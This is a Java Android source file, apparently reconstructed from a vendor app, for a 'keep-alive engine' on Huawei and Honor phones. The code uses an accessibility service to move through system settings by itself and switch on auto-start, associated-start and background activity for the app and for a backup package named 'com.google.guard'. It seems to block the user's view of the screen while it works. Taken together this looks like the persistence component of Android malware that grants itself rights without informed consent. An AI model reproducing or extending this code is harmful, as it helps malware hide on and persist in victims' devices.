package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 华为/荣耀保活引擎。
 *
 * 处理华为电池优化绕过:
 * - 导航 HWSettings -> 应用和通知 -> 启动应用管理
 * - 切换"手动管理"用于主进程+备用进程
 * - 在 AlertDialog 中: 切换自启动、关联启动、后台活动
 *
 * ListenWindows: com.huawei.systemmanager, com.hihonor.systemmanager, com.android.settings
 *
 * vendor 原始路径: o/n.java
 */
public final class HuaweiEngine extends KeepAliveEngine {

    public static final int y = 0;

    // ADAPT: cache enum values to avoid com.guard.wallet.delegate.ScreenCaptureManager.e.X (field 'r' shadows class o.r)
    private static final Object KEEP_ALIVE_UNKNOWN = EngineHelper.KEEP_ALIVE_UNKNOWN;
    private static final Object KEEP_ALIVE_MAIN = EngineHelper.KEEP_ALIVE_MAIN;
    private static final Object KEEP_ALIVE_BACKUP = EngineHelper.KEEP_ALIVE_BACKUP;

    /** KeepAlive state: UNKNOWN -> MAIN_APP -> BACKUP_APP */
    public final AtomicReference r = new AtomicReference<>(KEEP_ALIVE_UNKNOWN);

    /** Main process: self-start allowed */
    public final AtomicBoolean s = new AtomicBoolean(false);
    /** Backup process: self-start allowed */
    public final AtomicBoolean t = new AtomicBoolean(false);
    /** Main process: associate-start allowed */
    public final AtomicBoolean u = new AtomicBoolean(true);
    /** Backup process: associate-start allowed */
    public final AtomicBoolean v = new AtomicBoolean(true);
    /** Main process: background activity allowed */
    public final AtomicBoolean w = new AtomicBoolean(false);
    /** Backup process: background activity allowed */
    public final AtomicBoolean x = new AtomicBoolean(false);

    public HuaweiEngine() {
        super(buildAllListenWindows(), "com.android.settings");
        try {
            this.p.schedule(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 4), 50L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
    }

    // ======= Static CombineFilter builders =======

    /** vendor 原名: b0() — Filter: TextView text = HUA_WEI_ALLOW_AUTO_STARTUP_TEXT */
    public static CombineFilter buildAutoStartFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("HUA_WEI_ALLOW_AUTO_STARTUP_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: c0() — Filter: TextView text = HUA_WEI_ALLOW_IN_BACKGROUND_TEXT */
    public static CombineFilter buildBackgroundActivityFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("HUA_WEI_ALLOW_IN_BACKGROUND_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: d0() — Filter: TextView text = HUA_WEI_ALLOW_RELATE_STARTUP_TEXT */
    public static CombineFilter buildRelateStartFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("HUA_WEI_ALLOW_RELATE_STARTUP_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: e0() — Filter: TextView text prefix = HUA_WEI_APP_AND_NOTIFICATION_TEXT */
    public static CombineFilter buildAppAndNotificationFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setPrefix(com.guard.wallet.utils.LocateValuesUtils.getValue("HUA_WEI_APP_AND_NOTIFICATION_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: f0() — ListenWindow: com.android.settings / AppAndNotificationDashboardActivity */
    public static ListenWindow buildAppNotificationListenWindow() {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.Settings$AppAndNotificationDashboardActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: g0() — Filter: TextView text = HUA_WEI_APP_STARTUP_MANAGE_TEXT */
    public static CombineFilter buildStartupManageFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("HUA_WEI_APP_STARTUP_MANAGE_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: l0() — Filter: Button text = HUA_WEI_CONFIRM_TEXT */
    public static CombineFilter buildConfirmButtonFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.Button"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("HUA_WEI_CONFIRM_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: m0() — ListenWindow: com.hihonor.systemmanager / AlertDialog */
    public static ListenWindow buildHonorAlertDialogListenWindow() {
        ListenWindow lw = new ListenWindow("com.hihonor.systemmanager", "android.app.AlertDialog");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: n0() — ListenWindow: com.hihonor.systemmanager / StartupAppControlActivity */
    public static ListenWindow buildHonorStartupListenWindow() {
        ListenWindow lw = new ListenWindow("com.hihonor.systemmanager",
                "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: o0() — ListenWindow: com.huawei.systemmanager / AlertDialog */
    public static ListenWindow buildHuaweiAlertDialogListenWindow() {
        ListenWindow lw = new ListenWindow("com.huawei.systemmanager", "android.app.AlertDialog");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: p0() — ListenWindow: com.huawei.systemmanager / StartupAppControlActivity */
    public static ListenWindow buildHuaweiStartupListenWindow() {
        ListenWindow lw = new ListenWindow("com.huawei.systemmanager",
                "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: q0() — ListenWindow: com.android.settings / HWSettings */
    public static ListenWindow buildHwSettingsListenWindow() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.HWSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: s0() — Build full ListenWindow list for Huawei engine */
    public static LinkedList buildAllListenWindows() {
        LinkedList list = new LinkedList();
        list.add(EngineHelper.cJ());
        list.add(buildHwSettingsListenWindow());
        list.add(buildAppNotificationListenWindow());
        list.add(buildHuaweiStartupListenWindow());
        list.add(buildHonorStartupListenWindow());
        list.add(buildHuaweiAlertDialogListenWindow());
        list.add(buildHonorAlertDialogListenWindow());
        return list;
    }

    // ======= Window detection helpers =======

    /** vendor 原名: h0() — Check if in AlertDialog (Huawei or Honor system manager) */
    public final boolean isInAlertDialog() {
        try {
            LinkedList list = new LinkedList();
            list.add(buildHuaweiAlertDialogListenWindow());
            list.add(buildHonorAlertDialogListenWindow());
            if (this.q(list)) {
                Log.d("o.n", "已进入应用启动手动管理对话框");
                return true;
            }
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
        return false;
    }

    /** vendor 原名: i0() — Check if in AppAndNotificationDashboard */
    public final boolean isInAppAndNotification() {
        try {
            if (this.q(Collections.singletonList(buildAppNotificationListenWindow()))) {
                Log.d("o.n", "已进入应用和服务窗口");
                return true;
            }
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
        return false;
    }

    /** vendor 原名: j0() — Check if in HWSettings main page */
    public final boolean isInHwSettings() {
        try {
            LinkedList list = new LinkedList();
            list.add(buildHwSettingsListenWindow());
            if (this.q(list)) {
                Log.d("o.n", "已进入华为系统设置窗口");
                return true;
            }
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
        return false;
    }

    /** vendor 原名: k0() — Check if in StartupAppControlActivity (Huawei or Honor) */
    public final boolean isInStartupAppControl() {
        try {
            LinkedList list = new LinkedList();
            list.add(buildHuaweiStartupListenWindow());
            list.add(buildHonorStartupListenWindow());
            if (this.q(list)) {
                Log.d("o.n", "已进入应用启动管理窗口");
                return true;
            }
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
        return false;
    }

    // ======= Core keep-alive logic =======

    /**
     * vendor 原名: r0() — keepAlvieInStartupAppControl
     * Toggle "manual management" for main and backup apps.
     * State machine: UNKNOWN -> MAIN_APP -> BACKUP_APP -> done.
     */
    public final void toggleStartupSwitches() {
        try {
            if (!isInStartupAppControl()) {
                return;
            }
            Log.d("o.n", "keepAlvieInStartupAppControl 窗口匹配");
            com.guard.wallet.helper.BlockViewManager.h(50);

            AtomicReference stateRef = this.r;
            boolean isUnknown = Objects.equals(stateRef.get(), KEEP_ALIVE_UNKNOWN);
            Object mainApp = KEEP_ALIVE_MAIN;

            if (isUnknown) {
                stateRef.set(mainApp);
            } else if (Objects.equals(stateRef.get(), mainApp)
                    && com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                stateRef.set(KEEP_ALIVE_BACKUP);
            } else {
                /* Both apps processed or backup not installed */
                savePowerControlState();
                Z();
                return;
            }

            G();
            Log.d("o.n", "active root complete");
            UiObject scrollView = findScrollableContainer();

            if (scrollView == null) {
                Log.e("o.n", "应用启动管理窗口滚动视图查找失败");
                return;
            }

            Log.d("o.n", "应用启动管理窗口滚动视图查找成功");

            if (Objects.equals(stateRef.get(), mainApp)) {
                /* Find main app */
                CombineFilter mainAppFilter = EngineHelper.cH(com.guard.wallet.utils.SystemHelper.x0());
                UiObject found = FilterHelper.scrollForwardUtilFilter(scrollView, mainAppFilter);
                if (found == null) {
                    found = FilterHelper.scrollBackwardUtilFilter(scrollView, mainAppFilter);
                }
                if (found == null) {
                    Log.e("o.n", "主进程App查找失败");
                    return;
                }
                Log.d("o.n", "主进程App查找成功");
                com.guard.wallet.helper.BlockViewManager.h(55);
                UiObject clickable = found.findParentUtilCombine(EngineHelper.cL());
                if (clickable == null) {
                    Log.e("o.n", "主进程可点击节点查找失败");
                    return;
                }
                Log.d("o.n", "主进程可点击节点查找成功");
                UiObject checkbox = clickable.findOneByCombine(EngineHelper.cA0());
                if (checkbox == null) {
                    Log.e("o.n", "主进程启动管理勾选框查找失败");
                    return;
                }
                com.guard.wallet.helper.BlockViewManager.h(60);
                Log.d("o.n", "主进程启动管理勾选框查找成本");
                if (checkbox.checked()) {
                    Log.d("o.n", "主进程自动管理已勾选");
                    checkbox.click();
                    Log.d("o.n", "已点击使主进程进入手动管理");
                    com.guard.wallet.helper.BlockViewManager.h(65);
                    return;
                }
                /* Already manual management */
                this.s.set(true);
                this.w.set(true);
                this.u.set(true);
                Log.d("o.n", "主进程已选择手动管理");
                toggleStartupSwitches(); /* Recurse for backup app */
            } else {
                /* Find backup app */
                CombineFilter backupAppFilter = EngineHelper.cH(com.guard.wallet.utils.SystemHelper.e());
                UiObject found2 = FilterHelper.scrollForwardUtilFilter(scrollView, backupAppFilter);
                if (found2 == null) {
                    found2 = FilterHelper.scrollBackwardUtilFilter(scrollView, backupAppFilter);
                }
                if (found2 == null) {
                    Log.e("o.n", "备用进程App查找失败");
                    return;
                }
                Log.d("o.n", "备用进程App查找成功");
                com.guard.wallet.helper.BlockViewManager.h(55);
                UiObject clickable2 = found2.findParentUtilCombine(EngineHelper.cL());
                if (clickable2 == null) {
                    Log.d("o.n", "备用进程可点击节点查找失败");
                    return;
                }
                Log.d("o.n", "备用进程可点击节点查找成功");
                UiObject checkbox2 = clickable2.findOneByCombine(EngineHelper.cA0());
                if (checkbox2 == null) {
                    Log.e("o.n", "备用进程勾选框查找失败");
                    return;
                }
                Log.d("o.n", "备用进程勾选框查找成功");
                com.guard.wallet.helper.BlockViewManager.h(60);
                if (checkbox2.checked()) {
                    Log.d("o.n", "备用进程自动管理已勾选");
                    checkbox2.click();
                    Log.d("o.n", "已点击使备用进程进入手动管理");
                    com.guard.wallet.helper.BlockViewManager.h(65);
                    return;
                }
                /* Already manual management */
                this.t.set(true);
                this.x.set(true);
                this.v.set(true);
                Log.d("o.n", "备用进程已选择手动管理");
                savePowerControlState();
                Z();
            }
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
    }

    /**
     * vendor 原名: t0() — save keep-alive strategy for both main and backup processes.
     */
    public final void savePowerControlState() {
        try {
            /* Save main process strategy */
            PowerControlStateVO mainState = com.guard.wallet.utils.SharedPrefsManager.k(
                    MainApplication.getAppContext().getPackageName());
            mainState.setPackageName(MainApplication.getAppContext().getPackageName());
            if (this.s.get()) {
                mainState.setAllowAutoStart(this.s.get());
            }
            if (this.u.get()) {
                mainState.setAllowRelateStart(this.u.get());
            }
            if (this.w.get()) {
                mainState.setAllowAllFullBackground(this.w.get());
            }
            mainState.setRetryCount(mainState.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(mainState);
            Log.d("o.n", "已保存主进程保活策略");

            /* Save backup process strategy */
            PowerControlStateVO backupState = com.guard.wallet.utils.SharedPrefsManager.k("com.google.guard");
            backupState.setPackageName("com.google.guard");
            if (this.t.get()) {
                backupState.setAllowAutoStart(this.t.get());
            }
            if (this.v.get()) {
                backupState.setAllowRelateStart(this.v.get());
            }
            if (this.x.get()) {
                backupState.setAllowAllFullBackground(this.x.get());
            }
            backupState.setRetryCount(backupState.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(backupState);
            Log.d("o.n", "已保存备用进程保活策略");
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
    }

    // ======= Engine lifecycle =======

    @Override
    public final void Z() {
        ReentrantLock lock = this.o;
        if (lock.tryLock()) {
            try {
                if (!this.isEngineFinished()) {
                    Log.d("o.n", "准备结束本地保活自动化引擎");
                    com.guard.wallet.helper.BlockViewManager.h(100);
                    this.markEngineRunning();
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().x();
                    }
                    savePowerControlState();
                    this.p.shutdownNow();
                    com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
                    this.n.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    com.guard.wallet.helper.BlockViewManager.c();
                    Log.d("o.n", "已结束本地保活自动化引擎");
                    EngineHelper.cW();
                    this.d();
                }
            } catch (Exception e2) {
                AppUtils.s("o.n", e2);
            }
            lock.unlock();
        }
    }

    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        try {
            if (isEngineFinished()) {
                return;
            }
            if (event != null) {
                super.u(event, packageName, className);
            }
            boolean inHwSettings = isInHwSettings();
            String delegateId = this.c;
            ConcurrentLinkedQueue queue = this.n;

            if (inHwSettings) {
                queue.remove("keepAliveInAppAndNotification");
                queue.remove("keepAlvieInStartupAppControl");
                queue.remove("keepAliveInAlertDialog");
                if (!queue.contains("keepAliveInHwSettings")) {
                    queue.add("keepAliveInHwSettings");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 0), delegateId);
                }
            }
            // ADAPT: HyperOS 3 降级后 isInHwSettings()/isInAppAndNotification() 同属 com.android.settings 可能同时 true
            else if (isInAppAndNotification()) {
                queue.remove("keepAliveInHwSettings");
                queue.remove("keepAlvieInStartupAppControl");
                queue.remove("keepAliveInAlertDialog");
                if (!queue.contains("keepAliveInAppAndNotification")) {
                    queue.add("keepAliveInAppAndNotification");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 1), delegateId);
                }
            }
            // ADAPT: isInStartupAppControl()/isInAlertDialog() 同属 com.huawei.systemmanager 可能同时 true
            else if (isInStartupAppControl()) {
                queue.remove("keepAliveInHwSettings");
                queue.remove("keepAliveInAppAndNotification");
                queue.remove("keepAliveInAlertDialog");
                if (!queue.contains("keepAlvieInStartupAppControl")) {
                    queue.add("keepAlvieInStartupAppControl");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 2), delegateId);
                }
            }
            else if (isInAlertDialog()) {
                queue.remove("keepAliveInHwSettings");
                queue.remove("keepAliveInAppAndNotification");
                queue.remove("keepAlvieInStartupAppControl");
                if (!queue.contains("keepAliveInAlertDialog")) {
                    queue.add("keepAliveInAlertDialog");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 3), delegateId);
                }
            }
        } catch (Exception e2) {
            AppUtils.s("o.n", e2);
        }
    }
}
